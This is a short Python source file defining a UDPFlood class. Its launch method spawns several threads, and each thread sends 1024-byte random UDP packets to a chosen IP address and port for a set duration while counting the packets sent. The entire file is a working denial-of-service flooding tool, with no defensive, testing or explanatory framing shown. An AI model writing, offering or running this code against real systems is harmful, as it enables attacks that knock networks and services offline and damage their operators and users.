import socket
import random
import threading
import time

class UDPFlood:
    def __init__(self):
        self.packet_count = 0
    
    def launch(self, target_ip, target_port, duration, threads):
        def flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet_size = 1024
            data = random._urandom(packet_size)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock.sendto(data, (target_ip, target_port))
                    self.packet_count += 1
                except:
                    pass
            sock.close()
        
        worker_threads = []
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        for t in worker_threads:
            t.join(timeout=duration)
        
        return self.packet_count
